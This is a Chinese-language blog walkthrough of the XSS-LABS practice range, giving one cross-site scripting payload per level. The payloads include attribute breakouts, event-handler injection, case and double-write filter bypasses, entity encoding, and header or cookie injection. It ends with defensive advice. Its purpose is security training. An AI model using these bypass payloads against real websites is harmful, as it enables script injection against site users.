---
layout: post
title: "XSS-LABS靶场通关讲解"
date: 2025-03-09 17:51:35 +0800
description: "输入过滤：使用白名单限制特殊字符（如输出编码：根据上下文转义HTML/JS（如转为HTTP安全头Secure框架安全：避免直接使用v-html或innerHTML等危险API。"
keywords: "XSS-LABS靶场通关讲解"
categories: ['白帽黑客笔记']
tags: ['前端', 'Xss']
artid: "146135607"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146135607
    alt: "XSS-LABS靶场通关讲解"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146135607
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146135607
cover: https://bing.ee123.net/img/rand?artid=146135607
image: https://bing.ee123.net/img/rand?artid=146135607
img: https://bing.ee123.net/img/rand?artid=146135607
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     XSS-LABS靶场通关讲解
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h3>
     <a id="_0">
     </a>
     声明
    </h3>
    <p>
     <strong>
      文中涉及操作均来自靶机虚拟环境，禁止用于真实环境，任何未经授权的渗透测试都是违法行为！
     </strong>
    </p>
    <h3>
     <a id="_2">
     </a>
     靶场部署与工具推荐
    </h3>
    <ul>
     <li>
      <strong>
       环境搭建
      </strong>
      ：使用PHPStudy部署，源码从GitHub下载。
     </li>
     <li>
      <strong>
       测试工具
      </strong>
      ：Burp Suite（抓包）、ExifTool（修改EXIF）、XSStrike（自动化检测）。
     </li>
    </ul>
    <p>
     <a href="https://github.com/do0dl3/xss-labs">
      https://github.com/do0dl3/xss-labs
     </a>
     下载 xss-labs，
    </p>
    <p>
     解压后放到 phpstudy_pro 的 WWW 目录下，重命名为 xss-labs
    </p>
    <p>
     之后访问
     <a href="http://localhost/xss-labs/" rel="nofollow">
      http://localhost/xss-labs/
     </a>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/b906480007487a468608ccb36e0016e1.png"/>
    </p>
    <h3>
     <a id="1_Level_1_14">
     </a>
     1.
     <strong>
      Level 1（直接注入）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：GET参数
     <code>
      name
     </code>
     未过滤直接输出到HTML。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      &lt;script&gt;alert('xss')&lt;/script&gt;
     </code>
    </p>
    <p>
     <strong>
      原理
     </strong>
     ：服务端未转义用户输入，直接拼接至
     <code>
      &lt;h2&gt;
     </code>
     标签中。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c946d92ec9ed0fc4545d2eb6c0841e04.png"/>
    </p>
    <h3>
     <a id="2_Level_2_24">
     </a>
     2.
     <strong>
      Level 2（闭合属性值）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：输入框的
     <code>
      value
     </code>
     属性未过滤，但
     <code>
      &lt;h2&gt;
     </code>
     内容被转义。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
     </code>
    </p>
    <p>
     <strong>
      技巧
     </strong>
     ：闭合
     <code>
      value
     </code>
     的双引号，利用未过滤的输入点注入脚本。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/b364fa9905772fa44a658b58b979dbd5.png"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/8dd7eb3acdb4f60137fe44890bd183fb.png"/>
    </p>
    <h3>
     <a id="3_Level_3_36">
     </a>
     3.
     <strong>
      Level 3（事件触发绕过）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      &lt;
     </code>
     和
     <code>
      &gt;
     </code>
     被转义，但单引号未过滤。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      ' onfocus=javascript:alert() '
     </code>
    </p>
    <p>
     <strong>
      原理
     </strong>
     ：通过
     <code>
      onfocus
     </code>
     事件在输入框获得焦点时触发脚本。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c68ec6e6e5e6839ac35efdd6f86cde26.png"/>
    </p>
    <h3>
     <a id="4_Level_4_46">
     </a>
     4.
     <strong>
      Level 4（双引号闭合）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：双引号闭合属性值，过滤逻辑与Level 3相反。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      " onfocus=javascript:alert() "
     </code>
    </p>
    <p>
     <strong>
      技巧
     </strong>
     ：调整引号类型以适应服务端过滤规则。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/24ce0bae195697405a197598e9b347a5.png"/>
    </p>
    <h3>
     <a id="5_Level_5a_56">
     </a>
     5.
     <strong>
      Level 5（
     </strong>
     <code>
      &lt;a&gt;
     </code>
     <strong>
      标签利用）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      on
     </code>
     和
     <code>
      script
     </code>
     被过滤为
     <code>
      o_n
     </code>
     和
     <code>
      scr_ipt
     </code>
     。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      "&gt;&lt;a href="javascript:alert(1)"&gt;xss&lt;/a&gt;&lt;"
     </code>
    </p>
    <p>
     <strong>
      绕过
     </strong>
     ：利用
     <code>
      &lt;a&gt;
     </code>
     标签的
     <code>
      href
     </code>
     属性执行JavaScript伪协议。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/a992aba71e1281bc5be83a69164d4de9.png"/>
    </p>
    <h3>
     <a id="6_Level_6_67">
     </a>
     6.
     <strong>
      Level 6（大小写绕过）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：关键字过滤未统一大小写。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      "&gt;&lt;sCript&gt;alert()&lt;/sCript&gt;&lt;"
     </code>
    </p>
    <p>
     <strong>
      技巧
     </strong>
     ：通过混合大小写绕过黑名单检测。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/e50a919fba1a2b96533fd77150900aef.png"/>
    </p>
    <h3>
     <a id="7_Level_7_77">
     </a>
     7.
     <strong>
      Level 7（双写绕过）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      script
     </code>
     被替换为空，但仅过滤一次。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      "&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;&lt;"
     </code>
    </p>
    <p>
     <strong>
      原理
     </strong>
     ：双写敏感词使过滤后仍保留有效字符。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/f23bbc03ff247ba3b4f41635a00c7d99.png"/>
    </p>
    <h3>
     <a id="8_Level_8html__87">
     </a>
     8.
     <strong>
      Level 8（html 实体编码）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      href
     </code>
     属性自动解码Unicode。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      javascript:alert(1)
     </code>
     编码为
     <code>
      &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;
     </code>
    </p>
    <p>
     <strong>
      工具
     </strong>
     ：使用在线编码工具转换关键字符。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/41144544be0adf0cc692eb208b57ee43.png"/>
    </p>
    <h3>
     <a id="9_Level_9_97">
     </a>
     9.
     <strong>
      Level 9（注释符绕过）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：强制要求参数包含
     <code>
      http://
     </code>
     。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      javascript:alert()/*http://*/
     </code>
    </p>
    <p>
     <strong>
      技巧
     </strong>
     ：添加注释符绕过字符串检测。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/7bddce76fb2910547ef1e1f34b653b18.png"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/f4ea11db62a502f51752ba9624fdf184.png"/>
    </p>
    <h3>
     <a id="10_Level_10_109">
     </a>
     10.
     <strong>
      Level 10（隐藏表单注入）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：通过隐藏的
     <code>
      t_sort
     </code>
     参数注入事件。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      ?t_sort=" onfocus=alert() type="text
     </code>
    </p>
    <p>
     <strong>
      原理
     </strong>
     ：修改隐藏表单属性为可见并触发事件。
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/067ac5d12b1b6082b1899e7473c87648.png"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/6b31c4cea8029f89d7d8c7748fed0f2d.png"/>
    </p>
    <h3>
     <a id="11_Level_11Referer_119">
     </a>
     11.
     <strong>
      Level 11（Referer头注入）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      Referer
     </code>
     头未过滤写入隐藏表单。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：修改HTTP头为
     <code>
      Referer: " onfocus=alert() type="text
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/8a5a88b2e68372e4744004ebd994b436.png"/>
    </p>
    <h3>
     <a id="12_Level_12UserAgent_127">
     </a>
     12.
     <strong>
      Level 12（User-Agent注入）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      User-Agent
     </code>
     头未过滤。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：同Level 11，修改
     <code>
      User-Agent
     </code>
     字段。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/80c242926ec8c9c99ca9df980dcac2c7.png"/>
    </p>
    <h3>
     <a id="13_Level_13Cookie_135">
     </a>
     13.
     <strong>
      Level 13（Cookie注入）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：Cookie值未过滤写入页面。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：设置Cookie为
     <code>
      user=" onfocus=alert() type="text
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4b1384b081af7924e0e9872eb93a5593.png"/>
    </p>
    <h3>
     <a id="14_Level_14EXIF_XSS_143">
     </a>
     14.
     <strong>
      Level 14（EXIF XSS）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：图片EXIF信息未过滤。
    </p>
    <p>
     <strong>
      方法
     </strong>
     ：使用工具（如ExifTool）在图片元数据中插入脚本。
    </p>
    <h3>
     <a id="15_Level_15_149">
     </a>
     15.
     <strong>
      Level 15
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：
     <code>
      ng-include
     </code>
     指令包含外部页面。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      ?src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;'
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/52af52f762ebf75b8383c0c2999d90f2.png"/>
    </p>
    <h3>
     <a id="16_Level_16_159">
     </a>
     16.
     <strong>
      Level 16（空格与换行符）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：空格被编码为
     <code>
      &amp;nbsp;
     </code>
     ，换行符保留。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      &lt;img%0asrc=x%0aonerror=alert(1)&gt;
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4edc4feb9f447d815edc3b267a77ea15.png"/>
    </p>
    <h3>
     <a id="17_Level_1718Flash_XSS_169">
     </a>
     17.
     <strong>
      Level 17-18（Flash XSS）
     </strong>
    </h3>
    <p>
     <strong>
      漏洞点
     </strong>
     ：Flash未过滤参数，闭合标签属性。
    </p>
    <p>
     <strong>
      Payload
     </strong>
     ：
     <code>
      ?arg01=a&amp;arg02= onmouseover=alert(1)
     </code>
     <br/>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/696fd91886480b524f74d1900be38b6b.png"/>
    </p>
    <h3>
     <a id="_177">
     </a>
     三、防御思路总结
    </h3>
    <ol>
     <li>
      <strong>
       输入过滤
      </strong>
      ：使用白名单限制特殊字符（如
      <code>
       &lt;
      </code>
      ,
      <code>
       &gt;
      </code>
      ）。
     </li>
     <li>
      <strong>
       输出编码
      </strong>
      ：根据上下文转义HTML/JS（如
      <code>
       &lt;
      </code>
      转为
      <code>
       &amp;lt;
      </code>
      ）。
     </li>
     <li>
      <strong>
       HTTP安全头
      </strong>
      ：
     </li>
    </ol>
    <pre><code class="prism language-http">Content-Security-Policy: script-src 'self';
Set-Cookie: HttpOnly; Secure
</code></pre>
    <ol start="4">
     <li>
      <strong>
       框架安全
      </strong>
      ：避免直接使用
      <code>
       v-html
      </code>
      或
      <code>
       innerHTML
      </code>
      等危险API。
     </li>
    </ol>
    <hr/>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f:2f626c6f672e6373646e2e6e65742f65726963616c657a6c2f:61727469636c652f64657461696c732f313436313335363037" class_="artid" style="display:none">
 </p>
</div>


